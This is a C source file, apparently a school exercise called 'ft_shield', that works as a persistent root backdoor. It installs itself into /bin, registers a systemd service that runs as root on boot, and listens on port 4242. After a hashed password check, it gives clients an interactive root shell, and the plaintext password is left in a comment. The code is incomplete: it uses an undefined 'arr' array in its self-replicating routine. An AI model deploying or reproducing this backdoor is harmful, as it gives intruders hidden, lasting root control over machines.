#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
#include <sys/wait.h>
#include "string.h"
#include <fcntl.h>
#include "stdlib.h"
#include <linux/limits.h>
#include <time.h>
#include <time.h>
#include <sys/time.h>
#include <poll.h>


#define  PORT 4242
#define LOGIN "hlahwaou"


char target_dir[10000] = "/bin";
char target_path[] = "/bin/ft_shield";
char daemon_config_path[] = "/etc/systemd/system/";
char service_path[] = "/etc/systemd/system/ft_shield.service";
char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nWorkingDirectory=/bin\nExecStart=/bin/ft_shield\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
char cmd[1000];
char filePath[600];
int dbg; 
void dbg_msg(char *msg){
	write(dbg, msg, strlen(msg));
}

unsigned long hash(char *str){
    unsigned long h = 5381;

    for (int i = 0; str[i] != '\0'; i++){
        int c = str[i];
        h = ((h << 5) + h) + c;
    }

    return h;
}


bool in_bin(){
	char cwd[PATH_MAX];
	int len;
   
	if (getcwd(cwd, sizeof(cwd)) == NULL) 
		exit(1);
	if (realpath(target_dir,target_dir) == NULL)
		exit(1);
	return strcmp(cwd, target_dir) == 0;
}






void generate_file_path(){
	int pid = getpid(); 
	int index = 5;
    struct timeval tp;
	long ms;
    srand(time(NULL));
    unsigned int random_number = (unsigned int)rand(); 


	memcpy(filePath, "/tmp/",6 );
	gettimeofday(&tp, NULL);
	ms = tp.tv_sec * 1000 + tp.tv_usec / 1000;


	while (pid > 0){
	    filePath[index] = (pid % 10) + '0';
	    pid = pid / 10;
	    index++;
	}
	while (ms > 0){
	    filePath[index] = (ms % 10) + '0';
	    ms = ms / 10;
	    index++;
	}
    while (random_number > 0){
	    filePath[index] = (random_number % 10) + '0';
	    random_number  = random_number / 10;
	    index++;
	}
	filePath[index++] = '.';
	filePath[index++] = 'c';
	filePath[index] = '\0';
}

void quine(){
	generate_file_path();
	FILE* fptr = fopen(filePath, "w+");


	if (!fptr){
		perror("errro");
		printf("sorry\n");
		exit(0);
	}


	fprintf(fptr, "char arr[] = {");
	for (int i =0 ; i < sizeof(arr); i++){
		if (fprintf(fptr, "  %0#4x,", arr[i]) < 0)
			exit(0);
	}
	if (fprintf(fptr, "};\n") < 0 )
		exit(0);
	for (int i =0 ; i < sizeof(arr); i++){
		if (fprintf(fptr, "%c", arr[i]) < 0)
			exit(0);
	}
	fclose(fptr);
}


void compileTheCode(){
    	sprintf(cmd, "cc %s -o %s", filePath, target_path);
	if (system(cmd) != 0 )
		exit(1); 
}


void setUpService(){
	FILE* fptr = fopen("/etc/systemd/system/ft_shield.service", "w+");

	if (!fptr){
		perror("errro");
		printf("sorry\n");
		exit(0);
	}
	if (fprintf(fptr, "%s", daemon_config) < 0){
		perror("errro");
		printf("we wern't able to write our .service\n");
		exit(0);
	}
	fclose(fptr);
	int status = system("systemctl daemon-reload && systemctl enable ft_shield.service && systemctl start ft_shield.service");
	if (status == -1 || (WIFEXITED(status)  && WEXITSTATUS(status) != 0 )){
		printf("Error cmd '%s' exited %d\n", cmd, WEXITSTATUS(status));
		exit(1); 
	}
}





void configure_daemon(){
    
	// let the program create themself
	quine();
	// compile the code 
	compileTheCode();
	// clean file .c
	unlink(filePath);


	// now that we have binnary let's set the service 
	setUpService();
}



void display_login(){
	printf("%s\n", LOGIN);
}


void start_daemon(){
	int pid = fork();


	if (pid != 0)
		exit(0);

	//unmask the file mode
	umask(0);
	//set new session
	if( setsid() < 0)
		exit(1);
	// Change the current working directory to root.
	chdir("/");

    	int fd = open("/dev/null", O_RDWR);
	if (fd < 0)
		exit(1);

	// Close stdin. stdout and stderr and redirect them to /dev/null
    	if (dup2(fd , 0) == -1 || dup2(fd , 1) == -1 || dup2(fd , 2) == -1)
        	exit(1);
}

int create_socket() {
	int s_fd;
	int opt = 1;
	struct sockaddr_in address;

	if ((s_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
		exit(EXIT_FAILURE);

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);

	if (setsockopt(s_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)))
		exit(EXIT_FAILURE);


	if (bind(s_fd, (struct sockaddr *)&address, sizeof(address)) < 0) 
		exit(EXIT_FAILURE);


	if (listen(s_fd, 3) < 0) 
		exit(EXIT_FAILURE);

	return s_fd;
}

typedef struct client {
	int fd;
	pid_t pid;
	bool auth;
} t_client;


typedef struct server {
	t_client cl[3];
	int fd;
	struct pollfd fds[4];
	int n_conn;
} t_server;

t_server server;

unsigned long password= 15089076065643833894lu;

bool add_client(int fd){
	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
		if (server.fds[i].fd == -1){
			server.fds[i].fd = fd;
			server.fds[i].events = POLLIN;
			return true;
		}
	}
	return false;
}


void add_client_authenticated(int fd){

	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		if (server.cl[i].fd == -1){
			server.cl[i].fd = fd;
			server.cl[i].auth = true;
			break;
		}
	}
}

bool is_client_auth(int fd){

	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		if (server.cl[i].fd == fd && server.cl[i].auth == true)
			return true;
	}
	return false;
}

bool client_running_shell(int fd){

	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		if (server.cl[i].fd == fd && server.cl[i].auth == true && server.cl[i].pid != -1)
			return true;
	}
	return false;
}

bool authenticate_client(int fd){

	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		if (server.cl[i].fd == -1){
			server.cl[i].auth = true;
			server.cl[i].fd = fd;
			return true;
		}
	}
	return false;
}

bool add_pid_to_auth_client(int fd, pid_t pid){

	// close fd from the main process we don't need it 
	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		if (server.cl[i].fd == fd && server.cl[i].auth){
			server.cl[i].pid = pid;
			return true;
		}
	}
	return false;
}





void remove_client(int fd){

	close(fd);
	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
		if (server.fds[i].fd == fd){
			server.fds[i].fd = - 1;
		}
	}
	// check if client has a process and kill it
	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		if (server.cl[i].pid != -1 && server.cl[i].fd == fd){
 				if (kill(server.cl[i].pid, SIGKILL) == -1)
					exit(EXIT_FAILURE);
				if (waitpid(server.cl[i].pid, NULL,0 ) == -1)
					exit(EXIT_FAILURE);
				dbg_msg("a user process quite \n");
		}
	}

	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		if (server.cl[i].fd == fd){
			server.cl[i].fd = -1;
			server.cl[i].auth = false;
			server.cl[i].pid = -1;
		}
	}
}



void alert_client(int fd, char *msg, int len){
	send(fd, msg, len, 0);
}

bool valid_password(char *buffer){

    
    // HatimFt_shieldYahya
	return hash(buffer) == password;
}


pid_t reverse_shell(int fd){
	pid_t pid = fork();

	if (pid  < 0)
		exit(1);
	if (pid == 0){
		dup2(fd, 0);
    		dup2(fd, 1);
    		dup2(fd, 2);
		char * const argv[] = {"sh", NULL};
    		execvp("sh", argv);
	}
	return pid;
}





void init_server(){
	dbg = open("/tmp/ft_shield_logs", O_RDWR |O_TRUNC | O_CREAT);
	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
		server.fds[i].fd  = -1;
		server.fds[i].events  = 0;
		server.fds[i].revents= 0;
	}
	
	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
		server.cl[i].fd = -1;
		server.cl[i].auth = false;
		server.cl[i].pid = -1;
	}

	server.fd = create_socket();
	// adding the file discriptor of the server to the array
	server.fds[0] = (struct pollfd){server.fd,  POLLIN};
}




void monitor_processes(){
}


void server_reverse_shell(){
	
	init_server();
	

	while (true){
		if (poll(server.fds, sizeof(server.fds) / sizeof(struct pollfd), -1) < 0)
			exit(0);

		monitor_processes();
		for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
			if (!(server.fds[i].revents & POLLIN) || server.fds[i].fd == -1)
				continue;

			// new connection 
			if (server.fds[i].fd  ==  server.fd){
				int client_fd = accept(server.fd, NULL, NULL);
				if (client_fd < 0) 
					continue;
				if (!add_client(client_fd)){
					close(client_fd);
					continue;
				}
				dbg_msg("new connection\n");
			}
			else {
				// client need to provide password  
				int client_fd = server.fds[i].fd;
				int n = recv(client_fd, cmd, 100, 0);
				if (n <= 0){
					// remove client
					remove_client(client_fd);
					continue;
				}
				cmd[n - 1]  = '\0';
				//if user authenticated 
				if (is_client_auth(client_fd)){
					if (client_running_shell(client_fd)){
						recv(client_fd, cmd, 100, 0);
					}else if (strcmp("SHELL", cmd) == 0){

						dbg_msg("user want to run shell\n");
						// fork a process
						pid_t pid = reverse_shell(client_fd);
						// close fd in parent process
						add_pid_to_auth_client(client_fd, pid);
					}else{
						char *msg = "SHELL to get access to the shell as root users\n";
						alert_client(client_fd, msg , strlen(msg));
					}
				}
				else {
					// not authenticated and invalid password
					if (!valid_password(cmd)){
						dbg_msg("Invalid password\n");
						char *msg = "Invalid password\n";
						alert_client(client_fd, msg , strlen(msg));
					}else{
						dbg_msg("user is authenticated\n");
						char *msg = "You are authenticated\nWelcom to your reverse shell\n";
						alert_client(client_fd, msg , strlen(msg));
						authenticate_client(client_fd);
					}
				}
			}
		}
	}
}


int main(){

    // if we are in /bin 
    if (getuid() != 0){
        printf("you don't have root access\n");
	exit(0);
    }
    



    if (in_bin()) {
        printf("we are at bin\n");
    	start_daemon();
    	server_reverse_shell();
    } else {
       	   display_login();
	   start_daemon();
	   configure_daemon();
    }
    return 0;
}
